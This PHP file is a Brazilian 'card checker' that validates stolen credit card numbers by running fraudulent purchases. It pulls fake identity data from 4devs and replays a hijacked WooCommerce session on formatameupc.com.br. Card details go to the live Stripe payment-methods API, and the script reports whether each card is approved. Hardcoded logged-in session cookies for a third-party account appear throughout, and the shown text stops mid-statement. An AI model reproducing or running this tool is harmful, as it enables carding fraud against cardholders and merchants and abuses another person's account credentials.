<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================



$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }

    
$ip = $_SERVER['REMOTE_ADDR'];


/// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("#Error => Vai se foder randola.....!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("#Error => CC da época das caverna meu irmão kkkkk...!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

          die("#Error => Tacou 000 né? Seu ip foi bloqueado ...!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor");


}

$ip_ler = substr($ip, 0, 2);

if (($ip_ler == '77') or ($ip_ler == '51')!== false )  {

    die("#Error -> Pais bloqueado.!");

}




 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if (empty($scheme)!== false) {

    $retorno_scheme = "NÃO ENCONTRADO";

} else {

    $retorno_scheme = ''.$scheme.'';

}

if (empty($band)!== false) {

    $retorno_band = "NÃO ENCONTRADO";

} else {

    $retorno_band = ''.$band.'';
    
}


if (empty($bank)!== false) {

    $retorno_bank = "NÃO ENCONTRADO";

} else {

    $retorno_bank = ''.$bank.'';
    
}


if (empty($type)!== false) {

    $retorno_type = "NÃO ENCONTRADO";

} else {

    $retorno_type = ''.$type.'';
    
}


if (empty($states)!== false) {

    $retorno_states = "NÃO ENCONTRADO";

} else {

    $retorno_states = ''.$states.'';
    
}


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}


// RETORNOS DOS RESULTADOS DA BIN:  $retorno_band $retorno_scheme  $retorno_states $retorno_bank $retorno_type 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

));
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$endereco = metraiapuxar($dados, '"endereco":"','"');
$email = metraiapuxar($dados, '"email":"','"' , 1);
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)



// ================ // ====================//==========================//============================= // ================================//=================//



$link_produto = "https://formatameupc.com.br/loja/download-iso-original-windows-7-home-premium-64-bits/";

$header_produto = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'cookie: _gid=GA1.3.67607840.1671901177; __stripe_mid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc; wordpress_sec_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7Ca4dfa0d3a57195f00e2754d76610733c587b22106d07dafb987b6a7aa1f755c1; wordpress_logged_in_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7C65d78e628e2392539c6a4a2af535bc3e034f0c6b8390ec110ca1ea81fcf38937; wp_woocommerce_session_81bc2023843911953c4a11d09ad18125=3875%7C%7C1672073978%7C%7C1672070378%7C%7C09d4cb19f850ab039e9d2560ecc8214b; wfwaf-authcookie-6b3cafa55056971c542485874334b51b=3875%7Cother%7Cread%7C16af97b3a9dfde66954e437ed91f5477e0f88c221a365711a79f1568cc13cfbc; __stripe_sid=4f9c35bf-546b-4c43-a7b6-f96e7faa0bf80f3761; _ga_B2BR2Y790C=GS1.1.1671926134.2.1.1671926215.57.0.0; _ga=GA1.3.1690295783.1671901177',
'referer: https://formatameupc.com.br/loja/carrinho/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0'

);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_produto);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "GET");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini , CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_produto);
$produto = curl_exec($ini);


function AdcProduto () {


$link_adcproduto = "https://formatameupc.com.br/loja/download-iso-original-windows-7-home-premium-64-bits/";

$header_adcproduto = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryQ06k5B3YG74wqjye',
'cookie: _gid=GA1.3.67607840.1671901177; __stripe_mid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc; wordpress_sec_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7Ca4dfa0d3a57195f00e2754d76610733c587b22106d07dafb987b6a7aa1f755c1; wordpress_logged_in_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7C65d78e628e2392539c6a4a2af535bc3e034f0c6b8390ec110ca1ea81fcf38937; wp_woocommerce_session_81bc2023843911953c4a11d09ad18125=3875%7C%7C1672073978%7C%7C1672070378%7C%7C09d4cb19f850ab039e9d2560ecc8214b; wfwaf-authcookie-6b3cafa55056971c542485874334b51b=3875%7Cother%7Cread%7C16af97b3a9dfde66954e437ed91f5477e0f88c221a365711a79f1568cc13cfbc; __stripe_sid=4f9c35bf-546b-4c43-a7b6-f96e7faa0bf80f3761; _ga_B2BR2Y790C=GS1.1.1671926134.2.1.1671926312.57.0.0; _ga=GA1.3.1690295783.1671901177',
'origin: https://formatameupc.com.br',
'referer: https://formatameupc.com.br/loja/download-iso-original-windows-7-home-premium-64-bits/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0'

);


$post_adcproduto = '
------WebKitFormBoundaryQ06k5B3YG74wqjye
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryQ06k5B3YG74wqjye
Content-Disposition: form-data; name="add-to-cart"

2358
------WebKitFormBoundaryQ06k5B3YG74wqjye--';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_adcproduto);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini , CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_adcproduto);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_adcproduto);
$adc_produto = curl_exec($ini);

}


$link_selectpagamento = "https://formatameupc.com.br/?wc-ajax=update_order_review";

$header_selectpagamento = array (

'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _gid=GA1.3.67607840.1671901177; __stripe_mid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc; wordpress_sec_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7Ca4dfa0d3a57195f00e2754d76610733c587b22106d07dafb987b6a7aa1f755c1; wordpress_logged_in_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7C65d78e628e2392539c6a4a2af535bc3e034f0c6b8390ec110ca1ea81fcf38937; wp_woocommerce_session_81bc2023843911953c4a11d09ad18125=3875%7C%7C1672073978%7C%7C1672070378%7C%7C09d4cb19f850ab039e9d2560ecc8214b; __stripe_sid=4f9c35bf-546b-4c43-a7b6-f96e7faa0bf80f3761; wfwaf-authcookie-6b3cafa55056971c542485874334b51b=3875%7Cother%7Cread%7C407050974a84237e7dc80094ce6f977a4020e57dd9144f724d6cf0c6f4f094d5; woocommerce_items_in_cart=1; woocommerce_cart_hash=1b79077f38cf335c50da980fbb3ed8ee; _ga_B2BR2Y790C=GS1.1.1671926134.2.1.1671926803.57.0.0; _ga=GA1.3.1690295783.1671901177',
'origin: https://formatameupc.com.br',
'referer: https://formatameupc.com.br/loja/concluir-pedido/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0',
'x-requested-with: XMLHttpRequest'

);

$post_selectpagamento = 'security='.$x_security.'&payment_method=stripe_cc&country=BR&state=SP&postcode='.$cep.'&city='.$cidade.'&address='.$endereco.'&address_2=Casa&s_country=BR&s_state=SP&s_postcode='.$cep.'&s_city='.$cidade.'&s_address='.$endereco.'&s_address_2=Casa&has_full_address=true&post_data=billing_first_name%3DAnt%25C3%25B4nia%2520Emilly%2520Ramos%26billing_last_name%3DAnt%25C3%25B4nia%2520Emilly%2520Ramos%26billing_company%3DNENHUMA%26billing_country%3DBR%26billing_address_1%3'.$endereco.'%26billing_address_2%3DCasa%26billing_city%3D'.$cidade.'%26billing_state%3DSP%26billing_postcode%3D'.$cep.'%26billing_phone%3D5138264257%26billing_email%3Ddebora-pires%2540tuamaeaquelaursa.com%26order_comments%3D%26payment_method%3Dstripe_cc%26stripe_cc_token_key%3D%26stripe_cc_payment_intent_key%3D%26_stripe_installment_plan%3Dnone%26stripe_applepay_token_key%3D%26stripe_applepay_payment_intent_key%3D%26stripe_multibanco_token_key%3D%26stripe_multibanco_payment_intent_key%3D%26stripe_wechat_token_key%3D%26stripe_wechat_payment_intent_key%3D%26woocommerce-process-checkout-nonce%3D'.$nonce_do_caralho.'%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_selectpagamento);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_selectpagamento);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_selectpagamento);
$selecionar_formapagamento = curl_exec($ini);



$puxarnonce_link = "https://formatameupc.com.br/loja/concluir-pedido/";

$puxarnonce_header = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'cookie: _wcmpid=0bbb04e3-3e15-4f19-8b6c-92dc033fbed3; _gid=GA1.3.67607840.1671901177; woocommerce_items_in_cart=1; __stripe_mid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc; __stripe_sid=39857a74-2a83-4e5c-8276-b282521ff3b0643382; wordpress_sec_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7Ca4dfa0d3a57195f00e2754d76610733c587b22106d07dafb987b6a7aa1f755c1; wordpress_logged_in_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7C65d78e628e2392539c6a4a2af535bc3e034f0c6b8390ec110ca1ea81fcf38937; wp_woocommerce_session_81bc2023843911953c4a11d09ad18125=3875%7C%7C1672073978%7C%7C1672070378%7C%7C09d4cb19f850ab039e9d2560ecc8214b; wfwaf-authcookie-6b3cafa55056971c542485874334b51b=3875%7Cother%7Cread%7C16af97b3a9dfde66954e437ed91f5477e0f88c221a365711a79f1568cc13cfbc; _ga_B2BR2Y790C=GS1.1.1671901176.1.1.1671901527.34.0.0; _ga=GA1.3.1690295783.1671901177; woocommerce_cart_hash=b31c5893364b20fe2d690615bdf49853',
'referer: https://formatameupc.com.br/loja/carrinho/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $puxarnonce_link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "GET");
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $puxarnonce_header);
$nonce_puxei = curl_exec($ini);
$nonce_do_caralho = metraiapuxar($nonce_puxei, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"', 1);
$x_security = metraiapuxar($nonce_puxei, '"x_security":"','"', 1);



$link = "https://api.stripe.com/v1/payment_methods";

$post = 'type=card&billing_details[name]='.$nome.'&billing_details[address][city]='.$cidade.'&billing_details[address][country]=BR&billing_details[address][line1]='.$endereco.'&billing_details[address][line2]=Casa&billing_details[address][postal_code]='.$cep.'&billing_details[address][state]=SP&billing_details[email]=debora-pires%40tuamaeaquelaursa.com&billing_details[phone]='.$telefone_fixo.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d16819f3-51bc-46ad-be00-4b8e40a12080fb1c0a&muid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc&sid=39857a74-2a83-4e5c-8276-b282521ff3b0643382&pasted_fields=number&payment_user_agent=stripe.js%2F0d3c53128%3B+stripe-js-v3%2F0d3c53128&time_on_page=279233&key=pk_live_51Il5GaF5ibVtZDIa16teKDPZDkvE7eAtV9USeBJRCM9DuPGMAA8FLyZnQomo8Mh2QlkMyoXpa0KjlzubWfycXTWJ00knilZK0S&_stripe_account=acct_1Il5GaF5ibVtZDIa&_stripe_version=2022-08-01';


$header_link = array (

'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini , CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_link);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post);
$stripada = curl_exec($ini);
$id_stripao = metraiapuxar($stripada, '"id": "','"', 1);




$link2 = "https://formatameupc.com.br/?wc-ajax=checkout";

$header_2 = array (

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _gid=GA1.3.67607840.1671901177; woocommerce_items_in_cart=1; __stripe_mid=ee5c8107-9c69-41cf-99bc-bd589bc7d7f94c3bfc; __stripe_sid=39857a74-2a83-4e5c-8276-b282521ff3b0643382; wordpress_sec_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7Ca4dfa0d3a57195f00e2754d76610733c587b22106d07dafb987b6a7aa1f755c1; wordpress_logged_in_81bc2023843911953c4a11d09ad18125=debora-pires%7C1673110952%7C1nFmFAoxooMJ8d7T45xHIjb3yHn2JJCV9oz86qXd5TS%7C65d78e628e2392539c6a4a2af535bc3e034f0c6b8390ec110ca1ea81fcf38937; wp_woocommerce_session_81bc2023843911953c4a11d09ad18125=3875%7C%7C1672073978%7C%7C1672070378%7C%7C09d4cb19f850ab039e9d2560ecc8214b; wfwaf-authcookie-6b3cafa55056971c542485874334b51b=3875%7Cother%7Cread%7C16af97b3a9dfde66954e437ed91f5477e0f88c221a365711a79f1568cc13cfbc; _ga_B2BR2Y790C=GS1.1.1671901176.1.1.1671901527.34.0.0; _ga=GA1.3.1690295783.1671901177; woocommerce_cart_hash=b31c5893364b20fe2d690615bdf49853',
'origin: https://formatameupc.com.br',
'referer: https://formatameupc.com.br/loja/concluir-pedido/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0',
'x-requested-with: XMLHttpRequest'


);

$post_2 = 'billing_first_name='.$nome.'&billing_last_name='.$nome.'&billing_company=NENHUMA&billing_country=BR&billing_address_1='.$endereco.'&billing_address_2=Casa&billing_city='.$cidade.'&billing_state=SP&billing_postcode='.$cep.'&billing_phone='.$telefone_fixo.'&billing_email=debora-pires%40tuamaeaquelaursa.com&order_comments=&payment_method=stripe_cc&stripe_cc_token_key='.$id_stripao.'&stripe_cc_payment_intent_key=&_stripe_installment_plan=none&stripe_applepay_token_key=&stripe_applepay_payment_intent_key=&stripe_multibanco_token_key=&stripe_multibanco_payment_intent_key=&stripe_wechat_token_key=&stripe_wechat_payment_intent_key=&woocommerce-process-checkout-nonce='.$nonce_do_caralho.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link2);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_2);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_2);
$pagar = curl_exec($ini);

$metralha_gat = metraiapuxar($pagar, '"result":"','"', 1);

$metralha_json = json_decode($pagar, true);

$msg_retorno = $metralha_json['messages'];

if (empty($msg_retorno)!== false ) {

	$retorno = "Falha, sem resultados da (API).";

} else {

	$retorno = ''.$msg_retorno.'';

}


if (strpos($pagar, 'Sua sess\u00e3o expirou.')!== false ) {

AdcProduto();

die("#Error -> Produto inserido no carrinho, atualize o checker.");


}

if (empty($metralha_gat)!== false ) {

	$retorno_gat = "Falha sem resultados, da (API).";

} else if ($metralha_gat == 'failure') {

	$retorno_gat = "Não aprovada. (Rejected).";

} else {

	$retorno_gat = ''.$metralha_gat.'';

}



if(strpos($pagar, 'failure')!== false){

